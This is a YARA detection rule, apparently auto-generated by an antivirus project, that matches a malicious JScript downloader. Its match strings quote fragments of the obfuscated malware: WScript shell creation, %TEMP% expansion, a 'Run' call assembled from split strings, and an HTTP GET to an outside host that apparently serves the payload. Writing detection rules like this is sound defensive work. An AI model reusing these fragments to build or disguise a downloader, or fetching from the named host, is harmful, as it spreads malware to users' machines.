rule sig_20160428_846c15ebce5c9c083b7c17d763524e64 {
  meta:
    description = "datamaliciousorder - file 20160428_846c15ebce5c9c083b7c17d763524e64.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e3d5b410c91c7ee9ea87395a455649b5e99f71382dfb99618e7ca3827bc2f473"

  strings:
    $s1  = "function OxaYhoHdfQqmIwwJjkTbf(PawJyaKvfYawHodOzzHxy){CbsQxyPztWdkWgwSwaJww[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function MiwWyvFtdDwdHyrQlvGni() {return CbsQxyPztWdkWgwSwaJww[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function OxaYhoHdfQqmIwwJjkTbf(PawJyaKvfYawHodOzzHxy){CbsQxyPztWdkWgwSwaJww[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "JucQrfUdnDczYgcBmsJmn[PuyIbjSfjTlcMfbOjxPri](\"G\" + \"ET\", \"http://alex-naumov.ru/j8skdwq\", false);" fullword ascii
    $s5  = "var GjlHvuWdcPqfQnrMmzHyy = this[\"WScript\"];" fullword ascii
    $s6  = "function MiwWyvFtdDwdHyrQlvGni() {return CbsQxyPztWdkWgwSwaJww[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s7  = "function RetPytIcuRcsPtwHwrFdh(TbaZihKxmCarNtdAblSpw, JvlLwiGgsTulRxmYulGvr){HhlFjcSrvRzuApmKuuZqy = HhlFjcSrvRzuApmKuuZqy * 1; " ascii
    $s8  = "var CbsQxyPztWdkWgwSwaJww = function CahYwkWxsIrbIxjRrzAtt() {return GjlHvuWdcPqfQnrMmzHyy[RodYllLbwNkdEypGkhKwb](\"WScript\"+\"" ascii
    $s9  = "function KydQikRrxWflQzqSghRsk(){return HjnLamSwiWimOklEyuPeb + \"\";};" fullword ascii
    $s10 = "if (JucQrfUdnDczYgcBmsJmn[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s11 = "return TbaZihKxmCarNtdAblSpw - JvlLwiGgsTulRxmYulGvr;};" fullword ascii
    $s12 = "function SvhKrpNwpTmqBehGkeWqw() {return ((MdjZqnIhaDnfGopKflSmi == true) && (MdjZqnIhaDnfGopKflSmi == NvoHpzSlbUguPstZtiUfj)) ?" ascii
    $s13 = "function SvhKrpNwpTmqBehGkeWqw() {return ((MdjZqnIhaDnfGopKflSmi == true) && (MdjZqnIhaDnfGopKflSmi == NvoHpzSlbUguPstZtiUfj)) ?" ascii
    $s14 = "return RetPytIcuRcsPtwHwrFdh(1 == 1 ? TdzLqaZcwHfpComQfbIst : 0, 1 == 1 ? GwqAwvKbiJxwNpaYjqDei : 0);" fullword ascii
    $s15 = "var CbsQxyPztWdkWgwSwaJww = function CahYwkWxsIrbIxjRrzAtt() {return GjlHvuWdcPqfQnrMmzHyy[RodYllLbwNkdEypGkhKwb](\"WScript\"+\"" ascii
    $s16 = "MdjZqnIhaDnfGopKflSmi = true; " fullword ascii
    $s17 = "function EwiAjvIjxGyeEvbBkoQjb(LoeXuyNhbNnmLepHudEtg) {var CbbVrkVkxEylZkfAlkEwo = (1, 2, 3, 4, 5, LoeXuyNhbNnmLepHudEtg); retur" ascii
    $s18 = "function QgcDeeVbnEkuWgqTxhFcj()" fullword ascii
    $s19 = "var LkfWulCvgFvaIueZgjIlb = new this[\"D\"+\"ate\"]();" fullword ascii
    $s20 = "function RnoHdiTgzXybKtpBmaRlb(){return RodYllLbwNkdEypGkhKwb;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}